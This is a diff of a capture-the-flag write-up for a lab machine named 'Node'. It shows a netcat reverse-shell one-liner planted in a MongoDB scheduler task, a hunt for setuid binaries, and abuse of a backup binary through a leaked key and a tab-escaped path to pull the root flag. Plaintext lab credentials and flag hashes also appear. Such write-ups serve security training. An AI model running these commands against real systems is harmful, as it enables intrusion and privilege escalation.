@@ -210,30 +210,130 @@ tom       1231  0.0  6.6 1024156 50068 ?       Ssl  19:31   0:04 /usr/bin/node /
 mark      1610  0.0  0.1  14228  1020 pts/0    S+   23:05   0:00 grep --color=auto tom
 {% endhighlight %}
 
-
+Using the following command, we can access the command line interface of MongoDB.<br>
+Also it is possible to insert reverse shell command.
 {% highlight shell %}
-mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
+mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost/scheduler
 MongoDB shell version: 3.2.16
-connecting to: scheduler
-> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tbash; /bin/chown tom:admin /tmp/tbash; chmod g+s /tmp/tbash; chmod u+s /tmp/tbash"});
-WriteResult({ "nInserted" : 1 })
+connecting to: localhost/scheduler
+> db.tasks.insertOne( { cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.6 4444 >/tmp/f" } );
+{
+        "acknowledged" : true,
+        "insertedId" : ObjectId("5e8b80f878ddbff46dfcb0d7")
+}
 > exit
 bye
 {% endhighlight %}
 
-
-{% highlight shell %}
-mark@node:/tmp$ ./tbash -p
-tbash-4.3$ id
-uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
-{% endhighlight %}
-
-
 Launch a netcat listener.
 {% highlight shell %}
+root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
 
 {% endhighlight %}
+
+After a few minutes, we can get a reverse shell as user "tom".
+{% highlight shell %}
+root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 38860
+bash: cannot set terminal process group (1230): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$ id
+id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+{% endhighlight %}
+
+user.txt is in the directory "/home/tom".
+{% highlight shell %}
+tom@node:/$ cd /home/tom
+cd /home/tom
+tom@node:~$ ls
+ls
+user.txt
+tom@node:~$ cat user.txt
+cat user.txt
+e1156acc3574e04b06908ecf76be91b1
+{% endhighlight %}
+
 
 ## 3. Getting Root
 
+With the following command, we can find a binary file "/usr/local/bin/backup"
+{% highlight shell %}
+tom@node:/tmp$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/local/bin/backup
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/newuidmap
+/bin/ping
+/bin/umount
+/bin/fusermount
+/bin/ping6
+/bin/ntfs-3g
+/bin/su
+/bin/mount
+{% endhighlight %}
 
+Also, we can find a way to use this executable in the previous script "/var/www/myplace/app.js".<br>
+The "backup_key" is also in this code.
+{% highlight shell %}
+200   app.get('/api/admin/backup', function (req, res) {
+201     if (req.session.user && req.session.user.is_admin) {
+202       var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+203       var backup = '';
+{% endhighlight %}
+
+
+{% highlight shell %}
+tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "/roo\t/roo\t.txt" | base64 -d > /tmp/flag.zip
+<0afc3d98a8d0230167104d474 "/roo\t/roo\t.txt" | base64 -d > /tmp/flag.zip    
+tom@node:/tmp$ unzip flag.zip
+unzip flag.zip
+Archive:  flag.zip
+   skipping: root/root.txt           unable to get password
+tom@node:/tmp$ unzip -p magicword flag.zip
+unzip -p magicword flag.zip
+tom@node:/tmp$ ls
+ls
+flag
+flag.tmp
+flag.zip
+mongodb-27017.sock
+systemd-private-51fae6958043485ba3b33e8a7a5f1f2b-systemd-timesyncd.service-lTlFH0
+vmware-root
+tom@node:/tmp$ unzip -P magicword flag.zip
+unzip -P magicword flag.zip
+Archive:  flag.zip
+ extracting: root/root.txt           
+tom@node:/tmp$ ls
+ls
+flag
+flag.tmp
+flag.zip
+mongodb-27017.sock
+root
+systemd-private-51fae6958043485ba3b33e8a7a5f1f2b-systemd-timesyncd.service-lTlFH0
+vmware-root
+tom@node:/tmp$ cat root/root.txt
+cat root/root.txt
+1722e99ca5f353b362556a62bd5e6be0
+tom@node:/tmp$ 
+{% endhighlight %}
